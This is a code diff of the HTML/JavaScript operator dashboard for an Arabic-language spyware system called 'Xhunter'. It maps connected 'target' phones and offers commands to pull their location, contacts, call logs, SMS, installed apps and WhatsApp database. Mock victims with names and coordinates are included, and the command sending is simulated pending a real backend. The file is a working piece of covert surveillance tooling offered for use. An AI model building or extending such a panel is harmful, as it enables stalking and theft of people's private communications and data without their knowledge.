@@ -1,89 +1,775 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>نظام استخبارات Xhunter — لوحة التحكم</title>
-
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-<link rel="stylesheet" href="style.css">
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>نظام استخبارات Xhunter — لوحة التحكم</title>
+    
+    <!-- الخطوط -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- مكتبة الخرائط -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+    
+    <!-- أيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --primary-dark: #0d1b2a;
+            --primary: #1b263b;
+            --secondary: #415a77;
+            --accent: #778da9;
+            --text: #e0e1dd;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --danger: #f44336;
+            --info: #2196f3;
+            --dark: #0a0f1b;
+            --card-bg: rgba(27, 38, 59, 0.8);
+            --glow: 0 0 10px rgba(119, 141, 169, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--primary-dark), var(--dark));
+            color: var(--text);
+            min-height: 100vh;
+            direction: rtl;
+        }
+        
+        /* الهيدر */
+        header {
+            background: var(--primary);
+            padding: 1rem 2rem;
+            border-bottom: 1px solid var(--accent);
+            box-shadow: var(--glow);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .title {
+            font-size: 1.8rem;
+            font-weight: 700;
+        }
+        
+        .title span {
+            color: var(--accent);
+            text-shadow: 0 0 8px rgba(119, 141, 169, 0.7);
+        }
+        
+        /* شريط التنقل */
+        .topbar {
+            background: var(--primary);
+            padding: 0 1rem;
+            display: flex;
+            flex-wrap: wrap;
+            border-bottom: 1px solid rgba(119, 141, 169, 0.3);
+        }
+        
+        .tabs {
+            display: flex;
+            flex: 1;
+        }
+        
+        .tab {
+            background: none;
+            border: none;
+            color: var(--text);
+            padding: 1rem 1.5rem;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .tab:hover {
+            background: rgba(119, 141, 169, 0.2);
+        }
+        
+        .tab.active {
+            color: var(--accent);
+        }
+        
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--accent);
+            box-shadow: var(--glow);
+        }
+        
+        .controls {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+            padding: 0.5rem 0;
+        }
+        
+        .status, .last {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.9rem;
+        }
+        
+        .status::before {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: var(--danger);
+            border-radius: 50%;
+            display: inline-block;
+        }
+        
+        .status.connected::before {
+            background: var(--success);
+        }
+        
+        /* المحتوى الرئيسي */
+        main {
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+        
+        .panel {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .panel.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        /* الخريطة */
+        #map {
+            height: 500px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: var(--glow);
+            border: 1px solid var(--accent);
+        }
+        
+        /* القوائم */
+        .list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+        
+        .list li {
+            background: var(--card-bg);
+            padding: 1rem;
+            border-radius: 6px;
+            border-left: 3px solid var(--accent);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            transition: transform 0.2s ease;
+        }
+        
+        .list li:hover {
+            transform: translateX(-5px);
+        }
+        
+        /* الأزرار والنماذج */
+        .form-row {
+            margin-bottom: 1rem;
+        }
+        
+        .full {
+            width: 100%;
+            padding: 0.75rem;
+            background: rgba(13, 27, 42, 0.7);
+            border: 1px solid var(--accent);
+            border-radius: 4px;
+            color: var(--text);
+            transition: all 0.3s ease;
+        }
+        
+        .full:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px var(--accent);
+        }
+        
+        button {
+            padding: 0.75rem 1.5rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        
+        .primary {
+            background: var(--accent);
+            color: var(--primary-dark);
+        }
+        
+        .primary:hover {
+            background: var(--secondary);
+            box-shadow: var(--glow);
+        }
+        
+        .secondary {
+            background: rgba(119, 141, 169, 0.2);
+            color: var(--text);
+        }
+        
+        .secondary:hover {
+            background: rgba(119, 141, 169, 0.4);
+        }
+        
+        /* الفوتر */
+        .footer {
+            text-align: center;
+            padding: 1rem;
+            background: var(--primary);
+            border-top: 1px solid var(--accent);
+            margin-top: auto;
+            font-size: 0.9rem;
+        }
+        
+        /* بطاقات الأجهزة */
+        .device-card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(119, 141, 169, 0.3);
+        }
+        
+        .device-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+        }
+        
+        .device-name {
+            font-weight: 700;
+            color: var(--accent);
+        }
+        
+        .device-id {
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+        
+        .device-details {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 0.5rem;
+            font-size: 0.9rem;
+        }
+        
+        /* رسومات البيانات */
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1.5rem;
+        }
+        
+        .data-card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(119, 141, 169, 0.3);
+        }
+        
+        .data-card h4 {
+            margin-bottom: 1rem;
+            color: var(--accent);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        /* تصميم متجاوب */
+        @media (max-width: 768px) {
+            .topbar {
+                flex-direction: column;
+            }
+            
+            .tabs {
+                overflow-x: auto;
+                padding-bottom: 0.5rem;
+            }
+            
+            .controls {
+                justify-content: center;
+                padding: 0.5rem 0;
+            }
+            
+            #map {
+                height: 300px;
+            }
+            
+            .data-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* تأثيرات خاصة */
+        .glow-text {
+            text-shadow: 0 0 10px rgba(119, 141, 169, 0.7);
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* شريط التحميل */
+        .progress-bar {
+            height: 4px;
+            width: 100%;
+            background: rgba(119, 141, 169, 0.2);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 0.5rem;
+        }
+        
+        .progress {
+            height: 100%;
+            background: var(--accent);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+    </style>
 </head>
 <body>
-<header>
-  <div class="title">نظام استخبارات <span>Xhunter</span></div>
-</header>
+    <header>
+        <div class="title">
+            <i class="fas fa-satellite"></i>
+            نظام استخبارات <span>Xhunter</span>
+        </div>
+        <div class="user">
+            <i class="fas fa-user-secret"></i>
+            مسؤول النظام
+        </div>
+    </header>
 
-<nav class="topbar">
-  <div class="tabs">
-    <button data-tab="map" class="tab active">الخريطة</button>
-    <button data-tab="devices" class="tab">الأجهزة</button>
-    <button data-tab="data" class="tab">بيانات الجهاز</button>
-    <button data-tab="logs" class="tab">السجل</button>
-    <button data-tab="commands" class="tab">الأوامر</button>
-  </div>
-  <div class="controls">
-    <div class="status">أجهزة متصلة: <span id="statusCount">0</span></div>
-    <div class="last">آخر حدث: <span id="lastEvent">—</span></div>
-  </div>
-</nav>
+    <nav class="topbar">
+        <div class="tabs">
+            <button data-tab="map" class="tab active">
+                <i class="fas fa-map-marked-alt"></i>
+                الخريطة
+            </button>
+            <button data-tab="devices" class="tab">
+                <i class="fas fa-mobile-alt"></i>
+                الأجهزة
+            </button>
+            <button data-tab="data" class="tab">
+                <i class="fas fa-database"></i>
+                بيانات الجهاز
+            </button>
+            <button data-tab="logs" class="tab">
+                <i class="fas fa-clipboard-list"></i>
+                السجل
+            </button>
+            <button data-tab="commands" class="tab">
+                <i class="fas fa-terminal"></i>
+                الأوامر
+            </button>
+        </div>
+        <div class="controls">
+            <div class="status" id="statusIndicator">
+                <i class="fas fa-plug"></i>
+                أجهزة متصلة: <span id="statusCount">0</span>
+            </div>
+            <div class="last">
+                <i class="fas fa-clock"></i>
+                آخر حدث: <span id="lastEvent">—</span>
+            </div>
+        </div>
+    </nav>
 
-<main id="main">
-  <!-- خريطة -->
-  <section id="tab-map" class="panel active">
-    <div id="map"></div>
-  </section>
+    <main id="main">
+        <!-- خريطة -->
+        <section id="tab-map" class="panel active">
+            <div id="map"></div>
+            <div class="map-controls" style="margin-top: 1rem; display: flex; gap: 0.5rem;">
+                <button class="secondary" id="refreshMap">
+                    <i class="fas fa-sync"></i> تحديث الخريطة
+                </button>
+                <button class="secondary" id="zoomIn">
+                    <i class="fas fa-search-plus"></i> تكبير
+                </button>
+                <button class="secondary" id="zoomOut">
+                    <i class="fas fa-search-minus"></i> تصغير
+                </button>
+            </div>
+        </section>
 
-  <!-- أجهزة -->
-  <section id="tab-devices" class="panel">
-    <h3>الأجهزة المتصلة</h3>
-    <ul id="deviceList" class="list"></ul>
-  </section>
+        <!-- أجهزة -->
+        <section id="tab-devices" class="panel">
+            <h3><i class="fas fa-mobile-alt"></i> الأجهزة المتصلة</h3>
+            <div class="progress-bar">
+                <div class="progress" id="devicesProgress" style="width: 75%"></div>
+            </div>
+            <div id="deviceList" class="list" style="margin-top: 1.5rem;"></div>
+        </section>
 
-  <!-- بيانات الجهاز المحدد -->
-  <section id="tab-data" class="panel">
-    <h3>بيانات الجهاز</h3>
-    <div id="deviceInfo">اختر جهازاً من تبويب "الأجهزة" لعرض بياناته</div>
-  </section>
+        <!-- بيانات الجهاز المحدد -->
+        <section id="tab-data" class="panel">
+            <h3><i class="fas fa-database"></i> بيانات الجهاز</h3>
+            <p>اختر جهازاً من تبويب "الأجهزة" لعرض بياناته</p>
+            <div id="deviceInfo" class="data-grid" style="margin-top: 1.5rem;"></div>
+        </section>
 
-  <!-- السجل -->
-  <section id="tab-logs" class="panel">
-    <h3>سجل الأحداث</h3>
-    <ul id="logList" class="list"></ul>
-  </section>
+        <!-- السجل -->
+        <section id="tab-logs" class="panel">
+            <h3><i class="fas fa-clipboard-list"></i> سجل الأحداث</h3>
+            <div class="progress-bar">
+                <div class="progress" id="logsProgress" style="width: 60%"></div>
+            </div>
+            <div class="list" id="logList" style="margin-top: 1.5rem;"></div>
+        </section>
 
-  <!-- الأوامر -->
-  <section id="tab-commands" class="panel">
-    <h3>إصدار أوامر</h3>
-    <div class="form-row">
-      <select id="deviceSelect" class="full"></select>
-    </div>
-    <div class="form-row">
-      <select id="commandAction" class="full">
-        <option value="getLocation">طلب الموقع (Lock)</option>
-        <option value="getInstalledApps">التطبيقات المثبتة</option>
-        <option value="getContacts">جهات الاتصال</option>
-        <option value="getCallLog">سجل المكالمات</option>
-        <option value="getSMS">الرسائل</option>
-        <option value="downloadWhatsappDatabase">واتساب (DB)</option>
-        <option value="getExtraData">بيانات إضافية</option>
-      </select>
-    </div>
-    <div class="form-row">
-      <input id="commandData" placeholder='بيانات JSON (اختياري)' class="full"/>
-    </div>
-    <div class="form-row">
-      <button id="sendCommand" class="primary">إرسال الأمر</button>
-      <button id="clearLogs" class="secondary">مسح السجل</button>
-    </div>
-  </section>
-</main>
+        <!-- الأوامر -->
+        <section id="tab-commands" class="panel">
+            <h3><i class="fas fa-terminal"></i> إصدار أوامر</h3>
+            
+            <div class="form-row">
+                <label for="deviceSelect">الجهاز المستهدف:</label>
+                <select id="deviceSelect" class="full">
+                    <option value="">-- اختر جهاز --</option>
+                </select>
+            </div>
+            
+            <div class="form-row">
+                <label for="commandAction">نوع الأمر:</label>
+                <select id="commandAction" class="full">
+                    <option value="getLocation">طلب الموقع (Lock)</option>
+                    <option value="getInstalledApps">التطبيقات المثبتة</option>
+                    <option value="getContacts">جهات الاتصال</option>
+                    <option value="getCallLog">سجل المكالمات</option>
+                    <option value="getSMS">الرسائل</option>
+                    <option value="downloadWhatsappDatabase">واتساب (DB)</option>
+                    <option value="getExtraData">بيانات إضافية</option>
+                </select>
+            </div>
+            
+            <div class="form-row">
+                <label for="commandData">بيانات إضافية (JSON):</label>
+                <input id="commandData" placeholder='{"key": "value"}' class="full"/>
+            </div>
+            
+            <div class="form-row" style="display: flex; gap: 0.5rem; margin-top: 1.5rem;">
+                <button id="sendCommand" class="primary">
+                    <i class="fas fa-paper-plane"></i> إرسال الأمر
+                </button>
+                <button id="clearLogs" class="secondary">
+                    <i class="fas fa-trash"></i> مسح السجل
+                </button>
+            </div>
+            
+            <div id="commandStatus" style="margin-top: 1rem; padding: 1rem; background: var(--card-bg); border-radius: 6px; display: none;">
+                <i class="fas fa-circle-notch fa-spin"></i> جاري معالجة الأمر...
+            </div>
+        </section>
+    </main>
 
-<footer class="footer">
-  Xhunter • لوحة الاستخبارات — جاهز للعمل
-</footer>
+    <footer class="footer">
+        <i class="fas fa-shield-alt"></i> Xhunter • لوحة الاستخبارات — جاهز للعمل
+    </footer>
 
-<script src="/socket.io/socket.io.js"></script>
-<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-<script src="admin.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+    <script>
+        // عناصر DOM
+        const tabs = document.querySelectorAll('.tab');
+        const panels = document.querySelectorAll('.panel');
+        const statusCount = document.getElementById('statusCount');
+        const statusIndicator = document.getElementById('statusIndicator');
+        const lastEvent = document.getElementById('lastEvent');
+        const deviceList = document.getElementById('deviceList');
+        const deviceInfo = document.getElementById('deviceInfo');
+        const logList = document.getElementById('logList');
+        const deviceSelect = document.getElementById('deviceSelect');
+        const commandAction = document.getElementById('commandAction');
+        const commandData = document.getElementById('commandData');
+        const sendCommand = document.getElementById('sendCommand');
+        const clearLogsBtn = document.getElementById('clearLogs');
+        const commandStatus = document.getElementById('commandStatus');
+        const refreshMapBtn = document.getElementById('refreshMap');
+        const zoomInBtn = document.getElementById('zoomIn');
+        const zoomOutBtn = document.getElementById('zoomOut');
+
+        // بيانات التطبيق
+        let devices = [];
+        let map = null;
+        let markers = {};
+        let selectedDevice = null;
+
+        // تهيئة الخريطة
+        function initMap() {
+            map = L.map('map').setView([24.0, 45.0], 5);
+            
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '&copy; OpenStreetMap contributors'
+            }).addTo(map);
+            
+            // إضافة بعض النقاط الوهمية للعرض
+            addMockData();
+        }
+
+        // إضافة بيانات وهمية للعرض (ستتم إزالتها عند التكامل مع الخلفية الحقيقية)
+        function addMockData() {
+            const mockDevices = [
+                { id: 'dev-001', name: 'جهاز أحمد', lat: 24.7136, lng: 46.6753, lastSeen: '2023-07-15 14:30' },
+                { id: 'dev-002', name: 'جهاز محمد', lat: 21.5433, lng: 39.1728, lastSeen: '2023-07-15 13:45' },
+                { id: 'dev-003', name: 'جهاز سارة', lat: 26.4207, lng: 50.0888, lastSeen: '2023-07-15 12:20' }
+            ];
+            
+            mockDevices.forEach(device => {
+                const marker = L.marker([device.lat, device.lng]).addTo(map)
+                    .bindPopup(`<b>${device.name}</b><br>آخر ظهور: ${device.lastSeen}`);
+                
+                markers[device.id] = marker;
+            });
+            
+            // تحديث واجهة الأجهزة
+            updateDeviceList(mockDevices);
+            updateDeviceSelect(mockDevices);
+        }
+
+        // تحديث قائمة الأجهزة
+        function updateDeviceList(devices) {
+            deviceList.innerHTML = '';
+            
+            devices.forEach(device => {
+                const li = document.createElement('div');
+                li.className = 'device-card';
+                li.innerHTML = `
+                    <div class="device-header">
+                        <div class="device-name">${device.name}</div>
+                        <div class="device-id">${device.id}</div>
+                    </div>
+                    <div class="device-details">
+                        <div><i class="fas fa-clock"></i> آخر ظهور: ${device.lastSeen}</div>
+                        <div><i class="fas fa-map-marker-alt"></i> الموقع: ${device.lat.toFixed(4)}, ${device.lng.toFixed(4)}</div>
+                        <div><i class="fas fa-satellite"></i> الحالة: متصل</div>
+                    </div>
+                `;
+                
+                li.addEventListener('click', () => {
+                    selectDevice(device);
+                    switchTab('data');
+                });
+                
+                deviceList.appendChild(li);
+            });
+        }
+
+        // تحديث قائمة اختيار الأجهزة
+        function updateDeviceSelect(devices) {
+            deviceSelect.innerHTML = '<option value="">-- اختر جهاز --</option>';
+            
+            devices.forEach(device => {
+                const option = document.createElement('option');
+                option.value = device.id;
+                option.textContent = `${device.name} (${device.id})`;
+                deviceSelect.appendChild(option);
+            });
+        }
+
+        // اختيار جهاز
+        function selectDevice(device) {
+            selectedDevice = device;
+            
+            // عرض بيانات الجهاز
+            deviceInfo.innerHTML = `
+                <div class="data-card">
+                    <h4><i class="fas fa-info-circle"></i> معلومات الأساسية</h4>
+                    <p><strong>اسم الجهاز:</strong> ${device.name}</p>
+                    <p><strong>المعرف:</strong> ${device.id}</p>
+                    <p><strong>آخر ظهور:</strong> ${device.lastSeen}</p>
+                </div>
+                
+                <div class="data-card">
+                    <h4><i class="fas fa-map-marked-alt"></i> الموقع</h4>
+                    <p><strong>الإحداثيات:</strong> ${device.lat.toFixed(6)}, ${device.lng.toFixed(6)}</p>
+                    <p><strong>الدقة:</strong> ≈ 50 متر</p>
+                </div>
+                
+                <div class="data-card">
+                    <h4><i class="fas fa-chart-line"></i> الإحصائيات</h4>
+                    <p><strong>عدد الجهات:</strong> 124</p>
+                    <p><strong>الرسائل:</strong> 542</p>
+                    <p><strong>المكالمات:</strong> 78</p>
+                </div>
+            `;
+            
+            // توجيه الخريطة إلى موقع الجهاز
+            if (map && markers[device.id]) {
+                map.setView([device.lat, device.lng], 15);
+                markers[device.id].openPopup();
+            }
+        }
+
+        // تبديل التبويبات
+        function switchTab(tabName) {
+            // إخفاء جميع الألواح
+            panels.forEach(panel => panel.classList.remove('active'));
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            // إظهار اللوح المحدد
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+            
+            // تفعيل الزر المحدد
+            document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
+            
+            // إذا كانت الخريطة، نحدثها
+            if (tabName === 'map' && map) {
+                setTimeout(() => {
+                    map.invalidateSize();
+                }, 300);
+            }
+        }
+
+        // إضافة سجل جديد
+        function addLog(message, type = 'info') {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'device-card';
+            
+            const icon = type === 'error' ? 'exclamation-circle' : 
+                        type === 'success' ? 'check-circle' : 'info-circle';
+            
+            logEntry.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 0.5rem;">
+                    <i class="fas fa-${icon} ${type === 'error' ? 'text-danger' : type === 'success' ? 'text-success' : ''}"></i>
+                    <span>${new Date().toLocaleTimeString()}</span>
+                </div>
+                <div style="margin-top: 0.5rem;">${message}</div>
+            `;
+            
+            logList.appendChild(logEntry);
+            logList.scrollTop = logList.scrollHeight;
+            
+            // تحديث آخر حدث
+            lastEvent.textContent = new Date().toLocaleString();
+        }
+
+        // محاكاة اتصال WebSocket (سيتم استبداله بالاتصال الحقيقي)
+        function simulateWebSocket() {
+            // تحديث عدد الأجهزة بشكل عشوائي بين 0 و 5
+            const count = Math.floor(Math.random() * 6);
+            statusCount.textContent = count;
+            
+            if (count > 0) {
+                statusIndicator.classList.add('connected');
+                statusIndicator.querySelector('i').className = 'fas fa-plug connected';
+            } else {
+                statusIndicator.classList.remove('connected');
+                statusIndicator.querySelector('i').className = 'fas fa-plug';
+            }
+            
+            // إضافة سجل عشوائي كل 10 ثواني
+            if (Math.random() > 0.7) {
+                const messages = [
+                    'تم استلام بيانات الموقع من الجهاز dev-001',
+                    'جهاز جديد متصل: dev-004',
+                    'تم تنفيذ الأمر getContacts على الجهاز dev-002',
+                    'فشل في الاتصال بالجهاز dev-003'
+                ];
+                
+                const types = ['info', 'info', 'success', 'error'];
+                const index = Math.floor(Math.random() * messages.length);
+                
+                addLog(messages[index], types[index]);
+            }
+        }
+
+        // تهيئة التطبيق
+        function initApp() {
+            // تهيئة الخريطة
+            initMap();
+            
+            // إضافة بعض السجلات الأولية
+            addLog('تم تحميل لوحة التحكم بنجاح', 'success');
+            addLog('جاري البحث عن أجهزة متصلة...');
+            
+            // محاكاة اتصال WebSocket
+            setInterval(simulateWebSocket, 5000);
+            simulateWebSocket();
+            
+            // أحداث الأزرار
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    switchTab(tab.dataset.tab);
+                });
+            });
+            
+            sendCommand.addEventListener('click', () => {
+                const deviceId = deviceSelect.value;
+                const action = commandAction.value;
+                const data = commandData.value;
+                
+                if (!deviceId) {
+                    addLog('يرجى اختيار جهاز أولاً', 'error');
+                    return;
+                }
+                
+                commandStatus.style.display = 'block';
+                
+                // محاكاة إرسال الأمر
+                setTimeout(() => {
+                    commandStatus.style.display = 'none';
+                    addLog(`تم إرسال الأمر ${action} إلى الجهاز ${deviceId}`, 'success');
+                }, 2000);
+            });
+            
+            clearLogsBtn.addEventListener('click', () => {
+                logList.innerHTML = '';
+                addLog('تم مسح سجل الأحداث');
+            });
+            
+            refreshMapBtn.addEventListener('click', () => {
+                if (map) {
+                    map.invalidateSize();
+                    addLog('تم تحديث الخريطة');
+                }
+            });
+            
+            zoomInBtn.addEventListener('click', () => {
+                if (map) map.zoomIn();
+            });
+            
+            zoomOutBtn.addEventListener('click', () => {
+                if (map) map.zoomOut();
+            });
+        }
+
+        // بدء التطبيق عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
 </body>
-</html>
+                  </html>
